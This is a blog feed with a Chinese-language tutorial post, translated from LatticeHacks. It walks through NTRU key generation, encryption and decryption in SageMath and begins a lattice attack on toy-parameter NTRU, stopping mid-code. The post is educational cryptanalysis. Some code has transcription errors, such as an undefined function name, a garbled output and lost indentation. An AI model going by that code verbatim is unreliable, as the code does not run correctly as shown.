<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>K1rit0&#39;s Blog</title>
  
  <subtitle>111111</subtitle>
  <link href="http://tearsjin.github.io/atom.xml" rel="self"/>
  
  <link href="http://tearsjin.github.io/"/>
  <updated>2021-03-29T13:01:50.751Z</updated>
  <id>http://tearsjin.github.io/</id>
  
  <author>
    <name>K1rit0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Translation of LatticeHacks</title>
    <link href="http://tearsjin.github.io/2021/03/28/Translation-of-LatticeHacks/"/>
    <id>http://tearsjin.github.io/2021/03/28/Translation-of-LatticeHacks/</id>
    <published>2021-03-28T10:49:16.000Z</published>
    <updated>2021-03-29T13:01:50.751Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>打了个比赛NTRU不会做, 翻密码爷爷的博客发现一个宝藏网站<a href="https://latticehacks.cr.yp.to/">https://latticehacks.cr.yp.to</a><br>虽然内容不多, 还是英语的. 这里翻译翻译也顺便学习一下.</p></blockquote><h1 id="NTRU"><a href="#NTRU" class="headerlink" title="NTRU"></a>NTRU</h1><h2 id="多项式"><a href="#多项式" class="headerlink" title="多项式"></a>多项式</h2><p><code>Zx.&lt;x&gt; = ZZ[]</code></p><p>这里创建了一个<code>Zx</code>类, 一个Zx对象, 一个<code>Zx</code>对象是关于<code>x</code>的整系数多项式, 举个栗子:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sage : f &#x3D; Zx([3,1,4])</span><br><span class="line">sage : f</span><br><span class="line">4*x^2 + x + 3</span><br></pre></td></tr></table></figure><p>这个多项式<code>f</code>是$4x^2,x,3$这三部分的和. 每一部分都是整数系数(分别为4,1,3) 乘(times?)上一个$x$的次幂(为别为$x^2,x,1$)</p><p>也可以将上面的例子复制黏贴进<code>Sage</code>源代码里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f = Zx([<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>])</span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: 4*x^2 + x + 3</span></span><br></pre></td></tr></table></figure><h2 id="多项式乘法"><a href="#多项式乘法" class="headerlink" title="多项式乘法"></a>多项式乘法</h2><p><code>Zx</code>类有一个把每一部分相乘并相加的内置乘法. 比如说, $f$乘一个$x$, 或者是$x$的任意次方, 不过这样也就是在移动$f$的参数:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f</span><br><span class="line"><span class="comment"># output: 4*x^2 + x + 3</span></span><br><span class="line">f*x</span><br><span class="line"><span class="comment"># output: 4*x^3 + x^2 + 3*x</span></span><br></pre></td></tr></table></figure><p>再来个例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g = Zx([<span class="number">2</span>,<span class="number">7</span>,<span class="number">1</span>])</span><br><span class="line">g</span><br><span class="line"><span class="comment"># output: x^2 + 7*x + 2</span></span><br><span class="line">f*g</span><br><span class="line"><span class="comment"># output: 4*x^4 + 29*3^3 + 18*x^2 + 23*x + 6</span></span><br></pre></td></tr></table></figure><h2 id="循环卷积"><a href="#循环卷积" class="headerlink" title="循环卷积"></a>循环卷积</h2><blockquote><p>顺便学习一下循环卷积是怎样的<br>卷积分三种: 线性卷积, 周期卷积, 循环卷积<br>线性卷积: 就是普通的多项式乘法<br>循环卷积与周期卷积并没有本质区别, 循环卷积就是保留前一部分不动, 把后面的截下来加到前一部分去(就是模$X^n - 1$吧, 比如模$x^3-1$, 对于结果$x^4 + x^2 + x + 1 \mod x^3-1$来说, 就是把$x^4$模成$x$, 再加到前面去变成$x^2 + 2x + 1$) </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convolution</span>(<span class="params">f,g</span>):</span></span><br><span class="line"><span class="keyword">return</span> (f * g)% (x^n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这个乘法就是NTRU中使用的乘法. 它就像模一个$x^n-1$多项式乘法. 这意味着把$x^n$替换成1, 把$x^{(n+1)}$替换成$x$, 把$x^{n+2}$替换成$x^2$等等</p><p>输入两个模$x^{n-1}$的$n$系数多项式$f$和$g$, 那么输出也会是一个$n$次多项式, 因为$n$次及以上的式子都被约掉了. 所以是有可能存在一些甚至是全部项的系数为0. 我们常说的$n$系数多项式并不是说$1, x,…,x^{n-1}$全都存在, 而是说$x^n,x^{n+1}$ 等等的项不存在.</p><p>例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">3</span></span><br><span class="line">f*g</span><br><span class="line"><span class="comment"># output: 4*x^4 + 29*x^3 + 18*x^2 + 23*x + 6</span></span><br><span class="line">convolution(f,g)</span><br><span class="line"><span class="comment"># output: 18*x^2 + 27*x + 35</span></span><br></pre></td></tr></table></figure><p>另外一个例子, 计算$f$和$x$次幂的卷积, 就是在旋转$f$的系数.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">3</span></span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: 4*x^2 + x + 3</span></span><br><span class="line">convolution(f,x)</span><br><span class="line"><span class="comment"># output: x^2 + 3*x + 4</span></span><br><span class="line">convolution(f,x^<span class="number">2</span>)</span><br><span class="line"><span class="comment"># output: 3*x^2 + 4*x + 1</span></span><br></pre></td></tr></table></figure><p>注意, 这里的$n$是一个全局变量.</p><blockquote><p>原文这里还有两个练习, 一个是python练习, 一个是数学练习…这里就不翻译了, 也没什么必要.</p></blockquote><p><code>Sage</code>可以直接用<code>R = Zx.quotient(x^n-1)</code>生成一个加减乘运算都是$\mod x^{n-1} $的类<code>R</code></p><p>“cyclic convolution”(循环卷积) 或者是 “circular convolution” 这个名字来自与信号处理. 在多项式乘法中, 它叫”acyclic convolution”</p><h2 id="模约"><a href="#模约" class="headerlink" title="模约"></a>模约</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balancedmod</span>(<span class="params">f,q</span>):</span></span><br><span class="line">g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) %q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line"><span class="keyword">return</span> Zx(g)</span><br></pre></td></tr></table></figure><p><code>balancedmod()</code>有两个输入: 一个$n$整系数多项式$f$和一个正整数$q$. 输出一个也是n整系数, 并且每一个系数都$\mod q$. 数学家们通常定义模约的结果在$[0,q-1]$ 之中, 但这个函数的输出会将系数模约到$[-q/2,q/2]$之间, 更详细的说, 当$q$是偶数的时候, 结果的范围是$[-q/2,q/2-1]$;当$q$是奇数的时候, 范围是$[-(q-1)/2,(q-1)/2]$</p><p>来个例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">u = Zx([<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>])</span><br><span class="line">u</span><br><span class="line"><span class="comment"># output: 9*x^5 + 5*x^4 + x^3 + 4*x^2 + x + 3</span></span><br><span class="line">n = <span class="number">7</span></span><br><span class="line">balancedmod(u,<span class="number">10</span>)</span><br><span class="line"><span class="comment"># output: -x^5 - 5*x^4 + x^3 + 4*x^2 + x + 3</span></span><br><span class="line">balancedmod(u,<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: -x^4 + x^3 + x^2 + x</span></span><br></pre></td></tr></table></figure><p>在函数内部, <code>balancedmod()</code>依旧使用<code>Sage</code>的<code>% q</code>操作, 这个操作的输出会在$[0,q-1]$之间. 但这个函数会调整输入和输出到$q // 2$, 也就是$q / 2$取整数部分.</p><p>注意, 负数输入<code>% q</code>后在低级语言中往往会输出负数. 这样会泄露输入的符号(除非输入刚好是$q$的倍数, 那么输出就会是0). 泄露符号可以导致一些严重的安全问题, <code>Sage</code>支持对多项式进行<code>% p</code>这个操作, 但是输出<strong>有时候</strong>会泄露输入的符号, 比如说:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">u &#x3D; 314 - 159*x</span><br><span class="line">u % 200</span><br><span class="line"># output: -159*x + 114</span><br><span class="line">(u - 400) % 200</span><br><span class="line"># output: -159*x - 86</span><br><span class="line">(u - 600) % 200</span><br><span class="line"># output: -159*x + 114</span><br><span class="line">balancedmod(u,200)</span><br><span class="line"># output: 41*x - 86</span><br></pre></td></tr></table></figure><h2 id="d项非零的随机多项式-Random-polynomials-with-d-nonzero-coefficients"><a href="#d项非零的随机多项式-Random-polynomials-with-d-nonzero-coefficients" class="headerlink" title="d项非零的随机多项式(Random polynomials with d nonzero coefficients)"></a>d项非零的随机多项式(Random polynomials with d nonzero coefficients)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomdpoly</span>():</span></span><br><span class="line"><span class="keyword">assert</span> d &lt;= n</span><br><span class="line">result = n*[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">r = randrange(n)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> result[r]: <span class="keyword">break</span></span><br><span class="line">result[r] = <span class="number">1</span> - <span class="number">2</span>*randrange(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><p><code>randomdpoly()</code>返回一个有$d$个非零系数($n-d$个系数为0)的$n$次多项式. 而且每个非零的系数要么是1, 要么是-1.</p><p>来看例子(注意n和d是全局变量):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n &#x3D; 7</span><br><span class="line">d &#x3D; 5</span><br><span class="line">f &#x3D; randomdpoly()</span><br><span class="line">f</span><br><span class="line"># output: x^6 + x^5 - x^3 + x^2 - 1</span><br><span class="line">f &#x3D; randomdpoly()</span><br><span class="line">f</span><br><span class="line"># output: -x^4 + x^3 + x^2 - x + 1</span><br></pre></td></tr></table></figure><h2 id="模素数的除法"><a href="#模素数的除法" class="headerlink" title="模素数的除法"></a>模素数的除法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertmodprime</span>(<span class="params">f,p</span>):</span></span><br><span class="line">T = Zx.change_ring(Integers(p)).quotient(x^n-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br></pre></td></tr></table></figure><blockquote><p><code>litf()</code>, 把一个在环R/I中的数,  转成在R中</p></blockquote><p><code>invertmodprime()</code>会计算一个多项式在$\mod x^n-1 \mod p$下的逆元. </p><p>这个函数有两个输入, 一个$n$系数多项式$f$以及一个素数$p$(比如说 3). 输出一个$n$系数多项式$g$, 这个$g$满足$f \cdot g = 1 + p \cdot u$($f \cdot g$是循环卷积, $u$也是一个多项式). 如果多项式$g$不存在, 那么这个函数将报错. 举个例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: -x^4 + x^3 + x^2 - x + 1</span></span><br><span class="line">f3 = invertmodprime(f,<span class="number">3</span>)</span><br><span class="line">f3</span><br><span class="line"><span class="comment"># output: x^6 + 2*x^4 + x</span></span><br><span class="line">convolution(f,f3)</span><br><span class="line"><span class="comment"># output: 3*x^6 - 3*x^5 + 3*x^4 + 1</span></span><br></pre></td></tr></table></figure><p><code>convolution</code>的结果可以看成$1 + 3 \cdot u$, 其中$u = x^6 - x^5 + x^4$</p><p>事实上在模非素数的时候也是可能算出结果的, 但是由于<code>invertmodprime</code>使用了<code>Sage</code>中的子程序?(subroutines), 以至于该函数会没那么好的处理非素数模.</p><h2 id="模-2-n-的除法"><a href="#模-2-n-的除法" class="headerlink" title="模$2^n$的除法"></a>模$2^n$的除法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertmodpowerof2</span>(<span class="params">f,q</span>):</span></span><br><span class="line">     <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">     g = invertmodprime(f,<span class="number">2</span>)</span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       r = balancedmod(convolution(g,f),q)</span><br><span class="line">       <span class="keyword">if</span> r == <span class="number">1</span>: <span class="keyword">return</span> g</span><br><span class="line">       g = balancedmod(convolution(g,<span class="number">2</span> - r),q)</span><br></pre></td></tr></table></figure><p>这个函数跟上面的<code>invertmodprime</code>很像, 唯一的不同是输入$q$是$2^n$, 比如$2,4,8,16,…$ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">q = <span class="number">256</span></span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: -x^4 + x^3 + x^2 - x + 1</span></span><br><span class="line">fq = invertmodpowerof2(f,q)</span><br><span class="line">convolution(f,fq)</span><br><span class="line"><span class="comment"># output: -256*x^6 + 256*x^4 - 256*x ^2 + 257</span></span><br></pre></td></tr></table></figure><p><code>convolution</code>的结果可以看成$1 + 256 \cdot u$, 其中$u = x^6 + x^4 - x^2 + 1$</p><blockquote><p>这里依旧有个数学练习</p></blockquote><h2 id="NTRU-密钥生成"><a href="#NTRU-密钥生成" class="headerlink" title="NTRU 密钥生成"></a>NTRU 密钥生成</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keypair</span>():</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">f = randomdpoly()</span><br><span class="line">f3 = invertmodprime(f,<span class="number">3</span>)</span><br><span class="line">fq = invertmodpowerof(f,q)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">g = randomdpoly()</span><br><span class="line">publickey = balancedmod(<span class="number">3</span> * convolution(fq,g),q)</span><br><span class="line">secretkey = f,f3</span><br><span class="line"><span class="keyword">return</span> publickey,secretkey</span><br></pre></td></tr></table></figure><p><code>keypair()</code>会生成一个公钥<code>h</code>和对应的私钥<code>f,f3</code>. 公钥看起来就像一个随机的$\mod q$的$n$系数多项式. 比如说, 如果$n = 7, q = 256$, 那么公钥看起来就像一个7个随机的字节?(bytes):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">d = <span class="number">5</span></span><br><span class="line">q = <span class="number">256</span></span><br><span class="line">publickey, secretkey = keypair()</span><br><span class="line">publickey</span><br><span class="line"><span class="comment"># output: 54*x^6 - 40*x^5 + 90*x^4 + 101*x^3 - 108*x^2 + 80*x + 76</span></span><br></pre></td></tr></table></figure><p>其中一个私钥$f$是一个有小系数的多项式, 将$f$与公钥$h$卷积再$\mod q$能生成另外一个小系数的多项式, 也就是出现在密钥生成里的$3 \cdot g$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f,f3 &#x3D; secretkey</span><br><span class="line">f</span><br><span class="line"># output:-x^6 + x^5 - x^4 + x^2 + 1</span><br><span class="line">convolution(f, publickey)</span><br><span class="line"># output: 256*x^6 + 3*x^5 - 3*x^3 - 3*x^2 + 253*x - 253</span><br><span class="line">balancedmod(_,q)</span><br><span class="line"># output: 3*x^5 - 3*x^3 - 3*x^2 - 3*x + 3</span><br></pre></td></tr></table></figure><h2 id="用于加密的消息"><a href="#用于加密的消息" class="headerlink" title="用于加密的消息"></a>用于加密的消息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randommessage</span>():</span></span><br><span class="line">result = <span class="built_in">list</span>(randrange(<span class="number">3</span>) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))</span><br><span class="line"><span class="keyword">return</span> Zx(result)</span><br></pre></td></tr></table></figure><p>这个函数会返回一个$n$个系数为$\{1,0,-1\}$的多项式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">randommessage()</span><br><span class="line"><span class="comment"># output: -x^6 - x^5 + x^4</span></span><br><span class="line">randommessage()</span><br><span class="line"><span class="comment"># output: x^6 + x^5 - x^4 - 1</span></span><br><span class="line">randommessage()</span><br><span class="line"><span class="comment"># output: -x^4 - x^3 - x + 1</span></span><br><span class="line">randommessage()</span><br><span class="line"><span class="comment"># output: -x^6 + x^4 - x^2 + 1</span></span><br></pre></td></tr></table></figure><h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">message,publickey</span>):</span></span><br><span class="line">     r = randomdpoly()</span><br><span class="line">     <span class="keyword">return</span> balancedmod(convolution(publickey,r) + message,q)</span><br></pre></td></tr></table></figure><p>加密函数输入一个需要加密的消息和公钥$h$, 输出的密文为$h \cdot r + m \mod x^{n - 1} \mod q$,其中$m$是消息, $r$是随机的一个多项式.</p><p>例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">d = <span class="number">5</span></span><br><span class="line">q = <span class="number">256</span></span><br><span class="line">h,secretkey = keypair()</span><br><span class="line">h</span><br><span class="line"><span class="comment"># output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5</span></span><br><span class="line">m = randommessage()</span><br><span class="line">m</span><br><span class="line"><span class="comment"># output: -x^6 - x^4 + x^2 + 1</span></span><br><span class="line">c = encrypt(m,h)</span><br><span class="line">c</span><br><span class="line"><span class="comment"># output: -66*x^6 + 37*x^5 + 115*x^4 - 15*x^3 - 6*x^2 - 89*x + 27</span></span><br></pre></td></tr></table></figure><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertext,secretkey</span>):</span></span><br><span class="line">     f,f3 = secretkey</span><br><span class="line">     a = balancedmod(convolution(ciphertext,f),q)</span><br><span class="line">     <span class="keyword">return</span> balancedmod(convolution(a,f3),<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>解密函数需要输入密文和私钥</p><blockquote><p>这里作者测试了一下解密算法, 就知识简单的重复加完密再解密, 这部分就不写下来了.</p></blockquote><p>下面这个例子就是加解密的时候函数内部的所有过程, 用来说明解密的正确性:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line">d = <span class="number">5</span></span><br><span class="line">q = <span class="number">256</span></span><br><span class="line">h,secretkey = keypair()</span><br><span class="line">h</span><br><span class="line"><span class="comment"># output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5</span></span><br><span class="line">m = randommessage()</span><br><span class="line">m</span><br><span class="line"><span class="comment"># output: x^6 + x^5 - x^4 - x^3 + x - 1</span></span><br><span class="line">r = randomdpoly()</span><br><span class="line">r</span><br><span class="line"><span class="comment"># output: -x^6 + x^5 + x^4 + x^3 - x^2</span></span><br><span class="line">f = secretkey[<span class="number">0</span>]</span><br><span class="line">f</span><br><span class="line"><span class="comment"># output: -x^6 - x^5 - x^4 - x^3 - x</span></span><br><span class="line">g3 = balancedmod(convolution(f,h),q)</span><br><span class="line">g3</span><br><span class="line"><span class="comment"># output: -3*x^6 - 3*x^3 + 3*x^2 - 3*x - 3</span></span><br><span class="line">c = balancedmod(convolution(h,r) + m,q)</span><br><span class="line">c</span><br><span class="line"><span class="comment"># output: -93*x^6 - 105*x^5 - 110*x^4 - 95*x^3 - 106*x^2 </span></span><br><span class="line">a = balancedmod(convolution(f,c),q)</span><br><span class="line">a</span><br><span class="line"><span class="comment"># output: 3*x^5 - 13*x^4 - 3*x^3 + 2*x^2 - x + 3</span></span><br><span class="line">convolution(g3,r) + convolution(f,m)</span><br><span class="line"><span class="comment"># output: 3*x^5 - 13*x^4 - 3*x^3 + 2*x^2 - x + 3</span></span><br><span class="line">balancedmod(a,<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: -x^4 - x^2 - x</span></span><br><span class="line">balancedmod(convolution(f,m),<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: -x^4 - x^2 - x</span></span><br></pre></td></tr></table></figure><p>再看看过程,<br>$$<br>c = h \cdot r + m \mod q \\<br>f \cdot h = 3 \cdot g \mod q<br>$$<br>所以我们有:<br>$$<br>a = f \cdot c = f \cdot h \cdot r + f \cdot m = 3 \cdot g \cdot r + f \cdot m \mod q<br>$$<br>多项式$g,r,f,m$的系数都特别的小, 所以这里对$3 \cdot g \cdot r + f \cdot m$系数的最大值有限制. 只有当这个限制足够小, 小到$a \mod q$就是$3 \cdot g \cdot r + f \cdot m$, 这个时候$\mod 3$规约$a$就是在计算$f \cdot m \mod 3$, 最后再乘$f3$就能得到$m \mod 3$了</p><p>注意到解密是有可能失败的, 有一个办法避免对有效密文的解密失败就是标准化$n,d,q$的选取, 但是攻击者仍然可以故意选择无效密文来查看解密是否可以正常进行. 所以为了安全采取额外的措施抵抗这种选择密文攻击是很重要的!</p><h2 id="一个对参数过小的NTRU的攻击实例"><a href="#一个对参数过小的NTRU的攻击实例" class="headerlink" title="一个对参数过小的NTRU的攻击实例"></a>一个对参数过小的NTRU的攻击实例</h2><p>在下面的例子中, 参数将使用$n = 7,d = 5,q = 256$</p><p>攻击者将会从公钥$h = 3 \cdot g / f$入手. 我们可以计算$h3 = g / f$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">h</span><br><span class="line"><span class="comment"># output: -82*x^6 + 118*x^5 - 94*x^4 + 108*x^3 + 70*x^2 - 122*x + 5</span></span><br><span class="line">Integers(q)(<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: 171</span></span><br><span class="line">h3 = (<span class="number">171</span> * h)%q</span><br></pre></td></tr></table></figure><p>我们可以把$g$看成是私钥$f$乘$h3$. 记住, 私钥$f$是从$1,x,x^2,x^3,x^4,x^5,x^6$通过一些加减得到的. 那么$g$对应的就是从$h3,h3\cdot x,h3\cdot x^2,h3\cdot x^3,h3\cdot x^4,h3\cdot x^5,h3\cdot x^6$通过一些加减得到的.下面是这些多项式:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">h3</span><br><span class="line"><span class="comment"># output: 58*x^6 + 210*x^5 + 54*x^4 + 36*x^3 + 194*x^2 + 130*x + 87</span></span><br><span class="line">convolution(h3,x)</span><br><span class="line"><span class="comment"># output: 210*x^6 + 54*x^5 + 36*x^4 + 194*x^3 + 130*x^2 + 87*x + 58</span></span><br><span class="line">convolution(h3,x^<span class="number">2</span>)</span><br><span class="line"><span class="comment"># output: 54*x^6 + 36*x^5 + 194*x^4 + 130*x^3 + 87*x^2 + 58*x + 210</span></span><br><span class="line">convolution(h3,x^<span class="number">3</span>)</span><br><span class="line"><span class="comment"># output: 36*x^6 + 194*x^5 + 130*x^4 + 87*x^3 + 58*x^2 + 210*x + 54</span></span><br><span class="line">convolution(h3,x^<span class="number">4</span>)</span><br><span class="line"><span class="comment"># output: 194*x^6 + 130*x^5 + 87*x^4 + 58*x^3 + 210*x^2 + 54*x + 36</span></span><br><span class="line">convolution(h3,x^<span class="number">5</span>)</span><br><span class="line"><span class="comment"># output: 130*x^6 + 87*x^5 + 58*x^4 + 210*x^3 + 54*x^2 + 36*x + 194</span></span><br><span class="line">convolution(h3,x^<span class="number">6</span>)</span><br><span class="line"><span class="comment"># output: 87*x^6 + 58*x^5 + 210*x^4 + 54*x^3 + 36*x^2 + 194*x + 130</span></span><br></pre></td></tr></table></figure><p>事实上, $g = f\cdot h3 \mod q$, $q$ 可以从任意的参数通过加减得到. 这意味着$g$可以从$q,q\cdot x,q\cdot x^2,q\cdot x^3,q\cdot x^4,q\cdot x^5,q\cdot x^6,h3,h3\cdot x,h3\cdot x^2,h3\cdot x^3,h3\cdot x^4,h3\cdot x^5,h3\cdot x^6$组合而来</p><p>最后, 连接上面的这些系数并将产生的组合写进下面的矩阵中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 